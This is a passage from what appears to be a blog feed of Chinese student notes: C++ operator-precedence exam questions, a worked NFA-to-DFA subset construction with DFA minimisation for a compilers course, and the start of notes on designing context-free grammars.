&lt;Invalid operands to binary expression ('double' and 'int')&gt;</span>    w += <span class="hljs-number">-2</span>; <span class="hljs-comment">// w=3</span>    k = (a = <span class="hljs-number">2</span>, b = <span class="hljs-number">3</span>, a + b); <span class="hljs-comment">// k=5</span>    c = k = a = <span class="hljs-number">2</span>, b = <span class="hljs-number">3</span>, a + b; <span class="hljs-comment">// c=5, k=2, a=2, b=3</span>    a += a -= (b = <span class="hljs-number">4</span>) * (a = <span class="hljs-number">3</span>); <span class="hljs-comment">// a=-18, b=4</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"a=%d"</span>, a);    <span class="hljs-comment">//test 2</span>    <span class="hljs-type">int</span> d2i = <span class="hljs-string">'A'</span> + <span class="hljs-number">1.6</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"a2=%d"</span>, d2i); <span class="hljs-comment">//'A'+1.6=66.6=66 (ASCII code of 'A' is 65)</span>    <span class="hljs-comment">//test3</span><span class="hljs-comment">/*    d=9+e+f=d+9;</span><span class="hljs-comment">    expression is a value, not a variable in the memory,so it is not assignable */</span>}</code></pre></div></div><p><a href="https://blog.csdn.net/zb_915574747/article/details/99704639">优先级和结合性一览</a></p><h4 id="赋值运算">赋值运算</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8p1f7dlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-8p1f7dlmrh9u6a"><pre><code class="hljs c++">设有intx=<span class="hljs-number">11</span>：，则表达式(x++*<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)的值是</code></pre></div></div><p><span class="math inline">\(\lfloor 11*1/3 \rfloor=3\)</span></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210007724435_990_20221027094525768953_130_image-20221013142054782.png" alt="image-20221013142054782"><figcaption aria-hidden="true">image-20221013142054782</figcaption></figure><p>做题时容易犯的错误：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-04tom4lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-04tom4lmrh9u6a"><pre><code class="hljs c++">若d为<span class="hljs-type">double</span>型变量，则表达式d=<span class="hljs-number">1</span>，d+<span class="hljs-number">5</span>，d++的值是<span class="hljs-number">1</span>。d+<span class="hljs-number">5</span>不是d=d+<span class="hljs-number">5</span>。虽然很明显，做题的时候也需要有注意的意识</code></pre></div></div><h4 id="逻辑运算">逻辑运算</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210009306190_921_20221027094527376104_753_image-20221020095906292.png" alt="image-20221020095906292"><figcaption aria-hidden="true">image-20221020095906292</figcaption></figure><p>注意算术运算符优先于关系和除非以外的逻辑运算符！</p><p>短路运算举例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mf4cpulmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-mf4cpulmrh9u6a"><pre><code class="hljs c++">×=y=<span class="hljs-number">3</span>;t=++x||++y后，y的值是</code></pre></div></div><blockquote><p>3，因为后面不会被运算</p></blockquote><p>优先级只是起“加括号”的作用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-emh3k2lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-emh3k2lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-type">int</span> c,h;std::cout&lt;&lt;((c=<span class="hljs-number">2</span>)&amp;&amp;(h=<span class="hljs-number">-2</span>));<span class="hljs-comment">//always true</span></code></pre></div></div><h4 id="位运算">位运算</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210010905812_127_20221027094529486139_294_image-20221020105755065.png" alt="image-20221020105755065"><figcaption aria-hidden="true">image-20221020105755065</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210016259395_347_20221027094532506509_144_image-20221020104858172.png" alt="image-20221020104858172"><figcaption aria-hidden="true">image-20221020104858172</figcaption></figure><p>注意位运算的“地位”不是平等的，不要想当然按顺序算</p><h4 id="条件和逗号运算符">条件和逗号运算符</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210017313548_968_20221027094533764720_298_image-20221020111433316.png" alt="image-20221020111433316"><figcaption aria-hidden="true">image-20221020111433316</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xl9u8vlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-xl9u8vlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iomanip&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span><span class="hljs-params"><span class="hljs-function">{</span></span><span class="hljs-params"><span class="hljs-function">cout&lt;&lt;(<span class="hljs-number">0101</span>&amp;<span class="hljs-number">101</span>&gt;&gt;<span class="hljs-number">3</span>|<span class="hljs-number">101</span>&lt;&lt;<span class="hljs-number">3</span>^~<span class="hljs-number">0x10</span>)&lt;&lt;endl;</span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span></span><span class="hljs-params"><span class="hljs-function">}</span></span><span class="hljs-params"><span class="hljs-function"></span></span></code></pre></div></div><blockquote><p>优先级按位取反~最高，先将0x10（十六进制）按位取反，得到结果1111111111111111 1111111111101111，其次优先级按位左移和按位右移运算符优先级相同，计算101&gt;&gt;3得到00000000 00000000 00000000 00001100，以及101&lt;&lt;3得到 0000000000000000 0000001100101000，接下来计算0101（八进制）按位与（101&gt;&gt;3）的结果，得到结果为0,0按位或一个数所得结果为原值。因此最终答案为(101&lt;&lt;3)按位异或(~0x10)的结果，其结果为1111111111111111 11111100 11000111，为负数，求补得到绝对值。特别需要注意的是取反的时候是对整个int取反，16变-17</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dnosp3lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-dnosp3lmrh9u6a"><pre><code class="hljs c++">设intm=<span class="hljs-number">5</span>；<span class="hljs-type">float</span> x=<span class="hljs-number">3.5</span>；则表达式m+x+<span class="hljs-number">4.5</span>的结果应占据[填空]个字节。<span class="hljs-comment">//8。在隐式类型转换中转向了double</span></code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理-词法分析</title>
    <link href="/posts/6004/"/>
    <url>/posts/6004/</url>
    
    <content type="html"><![CDATA[<h1 id="编译原理-词法分析">编译原理-词法分析</h1><h2 id="正则表达式">正则表达式</h2><p>注意课上没提到的正则写法，仅作为了解</p><p><code>\w</code> 用于查找字母、数字和下划线</p><p><code>\W</code> 匹配除字母、数字和下划线之外的字符</p><p><code>\d</code> 仅用来匹配数字</p><p><code>\D</code>用来匹配数字之外的所有字符</p><p><code>\s</code> 仅匹配空白字符</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210524206495_377_20221107081612860400_768_image-20221105204422750.png" alt="image-20221105204422750" width="50%" height="50%"></p><p>首尾符号不同的a、b串</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-piozt2lmrh9u69"></i><span>c++</span><div class="collapse show" id="collapse-piozt2lmrh9u69"><pre><code class="hljs c++">(<span class="hljs-built_in">a</span>(a*b)+) | (<span class="hljs-built_in">b</span>(b*a)+)或(<span class="hljs-built_in">a</span>(a|b)*b) | (<span class="hljs-built_in">b</span>(a|b)*a)</code></pre></div></div><p>首尾符号相同的a、b串 <strong>包括只有a或b的情况</strong></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u46e3clmrh9u69"></i><span>c++</span><div class="collapse show" id="collapse-u46e3clmrh9u69"><pre><code class="hljs c++">(<span class="hljs-built_in">a</span>(b*a)*)|(<span class="hljs-built_in">b</span>(a*b)*)</code></pre></div></div><h2 id="nfa设计">NFA设计</h2><p>不包含字串011的01串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210525349884_991_20221107081614097039_483_image-20221105211752301.png" alt="image-20221105211752301"><figcaption aria-hidden="true">image-20221105211752301</figcaption></figure><p>偶数个0，偶数个1的0/1串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210526567412_869_20221107081615829280_894_image-20221105212835393.png" alt="image-20221105212835393"><figcaption aria-hidden="true">image-20221105212835393</figcaption></figure><p>能被3整除的二进制串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210527886997_545_20221107081617166099_636_image-20221105213415355.png" alt="image-20221105213415355"><figcaption aria-hidden="true">image-20221105213415355</figcaption></figure><h2 id="正则-nfa">正则-NFA</h2><p><code>Thomson 构造法</code>。基本思想是递归：</p><ol type="1"><li><p>对于基本的 re，直接构造</p></li><li><p>对于复合的 re，递归构造</p></li></ol><p>具体构造方式比较简单，在此略去</p><p>以(0 | 1)*110(0 | 1)*为例：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210529135341_633_20221107081618854779_247_image-20221106093147221.png" alt="image-20221106093147221"><figcaption aria-hidden="true">image-20221106093147221</figcaption></figure><h3 id="nfa-dfa">NFA-DFA</h3><p><code>子集构造法</code></p><h4 id="算法理解">算法理解：</h4><p>递推的思想</p><p>最简单的符号串ε：NFA状态集合←→DFA 状态</p><p>长度为1的串a=εa，在自动机中可达的状态为：从c对应的状态经过标记为a的边可达的状态</p><p>长度为2的串...</p><h4 id="算法需要注意的地方">算法需要注意的地方：</h4><ol type="1"><li><p>DFA新的状态对应NFA状态集消耗一个字符，能够走到的状态集。所以很明显，这里要消耗，所以不能是ε，并且只能消耗一个。</p></li><li><p>得到步骤 1 中的状态集之后，还需要考虑，这里面的所有节点，通过 ε能走到的所有状态。注意，这里的每个状态，只要可以通过 ε走，就必须一直走下去，也就是所谓的<code>ε-闭包</code>。这一步得到状态集的就是最后的结果。</p></li><li><p>第二步需要格外注意的是别忘了检查克林顿闭包中往回返的边。</p></li><li><p>只要包含了NFA中的终态，在DFA中就作为终态出现。</p></li><li><p>直到检查某一个状态的ε-闭包不再产生新状态的时候，算法停止。</p></li></ol><h4 id="实例">实例</h4><p>上面的图进行一遍子集构造的过程(往年的期末考题，推导过程要比课上讲的例子长一些，小心出错)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210529135341_633_20221107081618854779_247_image-20221106093147221.png" alt="image-20221106093147221"><figcaption aria-hidden="true">image-20221106093147221</figcaption></figure><p>先考虑空串：</p><p>ε_closure({0})={0, 1, 2, 4, 7}=A</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210532194577_427_20221107081622072895_220_image-20221106113307803.png" alt="image-20221106113307803"><figcaption aria-hidden="true">image-20221106113307803</figcaption></figure><p>在DFA里加入开始状态A。</p><p>由于只有2有能够消耗0的边，因此下一步从这个状态指向的3开始考虑：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210534447618_828_20221107081623719225_876_image-20221106113154787.png" alt="image-20221106113154787"><figcaption aria-hidden="true">image-20221106113154787</figcaption></figure><p>ε_closure(δ(A, 0))=ε_closure({3})={3, 6, 7, 1, 2, 4}={1, 2, 3, 4, 6,7}=B</p><p>同理。不过这一次在A中4和7都能提供消耗1的边，因此要从5和8开始拓展两次ε_closure：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210535648426_872_20221107081625192588_768_image-20221106113520151.png" alt="image-20221106113520151"><figcaption aria-hidden="true">image-20221106113520151</figcaption></figure><p>ε_closure(δ(A, 1))=ε_closure({5,8})={5, 6, 7, 1, 2, 4, 8}={1, 2, 4,5, 6, 7, 8}=C</p><p>考虑了所有消耗一个字符的情况后，我们的DFA应当是这个样子：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210536903027_990_20221107081626891613_879_image-20221106095750761.png" alt="image-20221106095750761" width="67%" height="67%"></p><p>B状态消耗0的状态是{3}。而{3}的ε闭包我们已经求过，它就是B：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210538031576_380_20221107081627912947_486_image-20221106094657352.png" alt="image-20221106094657352"><figcaption aria-hidden="true">image-20221106094657352</figcaption></figure><p>ε_closure(δ(B, 0))=ε_closure({3})=B</p><p>同样的，B消耗1后为{5,8}，它的ε闭包我们也是知道的，是C。</p><p>ε_closure(δ(B, 1))=ε_closure({5,8})=C</p><p>那么有：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210539258340_309_20221107081629295837_152_image-20221106113947097.png" alt="image-20221106113947097" width="67%" height="67%"></p><p>再来考察C：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210540531607_259_20221107081630470656_164_image-20221106100409568.png" alt="image-20221106100409568"><figcaption aria-hidden="true">image-20221106100409568</figcaption></figure><p>ε_closure(δ(C, 0))=ε_closure({3})=B</p><p>ε_closure(δ(C, 1))=ε_closure({5,8,9})={5, 6, 7, 1, 2, 4, 8, 9}={1, 2,4, 5, 6, 7, 8, 9}=D</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210541717135_769_20221107081632830316_747_image-20221106100750517.png" alt="image-20221106100750517"><figcaption aria-hidden="true">image-20221106100750517</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210543144145_212_20221107081635290017_116_image-20221106114421614.png" alt="image-20221106114421614" width="67%" height="67%"></p><p>考察新状态D：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210544300675_259_20221107081636596912_786_image-20221106101039674.png" alt="image-20221106101039674"><figcaption aria-hidden="true">image-20221106101039674</figcaption></figure><p>ε_closure(δ(D, 0))=ε_closure({3,10})={3, 6, 7, 1, 2, 4, 10, 11, 12,14, 17}={1, 2, 3, 4, 6, 7, 10, 11, 12, 14, 17}=E</p><p>这一次覆盖的状态包含了终态17.因此在DFG中E就要加一个圈，表示终态。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210545455540_648_20221107081638049390_665_image-20221106101722642.png" alt="image-20221106101722642"><figcaption aria-hidden="true">image-20221106101722642</figcaption></figure><p>ε_closure(δ(D, 1))=ε_closure({4,7,8})=D</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210546517685_226_20221107081639688157_503_image-20221106114710326.png" alt="image-20221106114710326" width="67%" height="67%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210545455540_648_20221107081638049390_665_image-20221106101722642.png" alt="image-20221106101722642"><figcaption aria-hidden="true">image-20221106101722642</figcaption></figure><p>ε_closure(δ(E, 0))=ε_closure({3,13})={1, 2, 3, 4, 6, 7, 11, 12, 13,14, 16, 17}=F</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210549141377_330_20221107081642146138_964_image-20221106164356951.png" alt="image-20221106164356951"><figcaption aria-hidden="true">image-20221106164356951</figcaption></figure><p>ε_closure(δ(E, 1))=ε_closure({5,8,15})={ 1, 2, 4, 5, 6, 7, 8, 11, 12,14, 15, 16, 17}=G</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210550434003_492_20221107081643785412_875_image-20221106164315789.png" alt="image-20221106164315789"><figcaption aria-hidden="true">image-20221106164315789</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210551952501_856_20221107081645146555_627_image-20221106164515007.png" alt="image-20221106164515007" width="67%" height="67%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210549141377_330_20221107081642146138_964_image-20221106164356951.png" alt="image-20221106164356951"><figcaption aria-hidden="true">image-20221106164356951</figcaption></figure><p>ε_closure(δ(F, 0))=ε_closure({3,13})=F</p><p>ε_closure(δ(F, 1))=ε_closure({5,8,15})=G</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210550434003_492_20221107081643785412_875_image-20221106164315789.png" alt="image-20221106164315789"><figcaption aria-hidden="true">image-20221106164315789</figcaption></figure><p>ε_closure(δ(G, 0))=ε_closure({3,13})=F</p><p>ε_closure(δ(G, 1))= ε_closure({5,8,9,15})={ 1, 2, 4, 5, 6, 7, 8, 9,11, 12, 14, 15, 16, 17}=H</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210555562961_855_20221107081649213700_939_image-20221106164831871.png" alt="image-20221106164831871"><figcaption aria-hidden="true">image-20221106164831871</figcaption></figure><p>ε_closure(δ(H, 0))=ε_closure({3,10,13})={1, 2, 3, 4, 6, 7, 10, 11,12, 13, 14, 16, 17}=I</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210557006457_224_20221107081650544945_592_image-20221106165419438.png" alt="image-20221106165419438"><figcaption aria-hidden="true">image-20221106165419438</figcaption></figure><p>ε_closure(δ(H, 1))=H</p><p>ε_closure(δ(I, 0))=F</p><p>ε_closure(δ(I, 1))=G</p><p>发现I不再产生新的状态了，长舒一口气，终于可以结束了。</p><p>最终的DFA如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210558147478_146_20221107081651688510_197_image-20221106114818599.png" alt="image-20221106114818599"><figcaption aria-hidden="true">image-20221106114818599</figcaption></figure><p>做题技巧：做到后面可以连同记下求过的ε_closure。A⊆B则ε_closure(A)⊆ε_closure(B)</p><p>识别0111010过程：A →B →C →D →D →E →G →F</p><h2 id="dfa优化">DFA优化</h2><h4 id="优化思想">优化思想</h4><p>具有非ε的输出边的状态显然是NFA中的重要状态</p><p>δ(s，a)不空，当且仅当s是重要状态→决定了ε_closure(δ(T，a))的计算→子集构造法的核心</p><p>两个子集若具有相同的重要状态，且同时包含或同时不包含终态，则可看作等价</p><h4 id="算法理解-1">算法理解</h4><p>下面这一篇文章对正则到DFA和DFA最小化的思想和具体实现剖析的比较透彻。其中正则到DFA并非重点考察内容，但对理解DFA优化的思想有比较大的帮助。</p><p><a target="_blank" href="https://wangwangok.github.io/2019/10/28/compiler_regular2dfa/" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">词法分析-正则表达式到DFA</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://wangwangok.github.io/2019/10/28/compiler_regular2dfa/</span></span></span></a></p><h4 id="实例-1">实例</h4><p>最小化上面求得的DFA：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210558147478_146_20221107081651688510_197_image-20221106114818599.png" alt="image-20221106114818599"><figcaption aria-hidden="true">image-20221106114818599</figcaption></figure><p>初始非终态{A, B, C, D}，终态{E, F, G, H, I}，</p><p>终态内部自己打转儿，不可再分</p><p>0将前者分裂为{A, B, C}和{D}，1将前者分裂为{A,B}和{C}，至此不可再分</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210600746159_100_20221107081655357057_638_image-20221106175951220.png" alt="image-20221106175951220"><figcaption aria-hidden="true">image-20221106175951220</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理-上下文无关文法</title>
    <link href="/posts/44201/"/>
    <url>/posts/44201/</url>
    
    <content type="html"><![CDATA[<h1 id="编译原理-上下文无关文法">编译原理-上下文无关文法</h1><h2 id="cfg基本概念">CFG基本概念</h2><p><font color="Apricot">符号串集合！</font></p><p>CFG可以表示所有正则表达式的所能表达文法集合，反过来不成立</p><h3 id="cfg设计">CFG设计</h3><p>可以结合正则表达式设计，思路类似。</p><ul><li><p>最基本的一个例子：<span class="math inline">\(L=\{abb^{2n}|n≥0\}\)</span></p><p>S→b|aSbb</p></li><li><p>设计接受语言<span class="math inline">\({\{a^ib^ja^kb^l| i+j=k+l,i, j, k, l&gt;=0\}}\)</span>的上下文无关文法。</p><p>S→aSb | A | B | M</p><p>A→aAa | M</p><p>B→bBb | M</p><p>M→bMa | e</p><p>思路：两边对称，先构造中间，再对称的加a或b。特别注意，A，B只涵盖了“一边的情况，所以”S→aSb“是必须的。</p></li><li><p>设计接受C++数组声明语句的上下文无关文法，其中数组元素类型限定为int、char及它们的指针，数组维数可以是任意维。</p><p>D→T id M ;</p><p>T→int | char | T*</p><p>M→M [num] | [num]</p><p>注意：指针也可以套任意个</p></li><li><p>形如xy(x≠y)的01串</p><p><span class="math inline">\(S \rightarrow A B \mid B A\)</span> <span class="math inline">\(A \rightarrow X A X \mid 0\)</span> ( <span class="math inline">\(A\)</span> 是奇数长度, 中间为 0 的串) <span class="math inline">\(B \rightarrow X B X \mid 1\)</span> ( <span class="math inline">\(B\)</span> 是奇数长度, 中间为 1 的串) <span class="math inline">\(X \rightarrow 0 \mid 1\)</span></p></li><li><p>接受语言 <span class="math inline">\(\left\{a^i b^j a^k \midj=i+k, i&gt;=0, k&gt;=0\right\}\)</span> 的上下文无关文法。 答: <span class="math display">\[\begin{aligned}&amp;\mathbf{S} \rightarrow \mathbf{A B} \\&amp;\mathbf{A} \rightarrow \mathbf{a A b} \mid \varepsilon \\&amp;\mathbf{B} \rightarrow \mathbf{b B a} \mid \varepsilon\end{aligned}\]</span></p></li></ul><p>练习：</p><ol type="1"><li><p><span class="math inline">\(\quad\left\{0^i 1^j 0^k \mid j=2i+k\right\}\)</span></p><p>仿照最后一个题容易得到答案</p></li><li><p>无法写成 <span class="math inline">\(x x\)</span> 形式的 01串</p><p>仿照倒数第二个题，<span class="math inline">\(S \rightarrow A B \midB A \mid A \mid B \mid \varepsilon\)</span></p></li></ol><h3 id="nfa和cfg转换">NFA和CFG转换</h3><p>一一对应即可，非常简单</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205642582509_675_20221201120121396547_551_image-20221115092857560.png" alt="image-20221115092857560"><figcaption aria-hidden="true">image-20221115092857560</figcaption></figure><p>注意别忘了终态的规则(替换空串)</p><figure><img 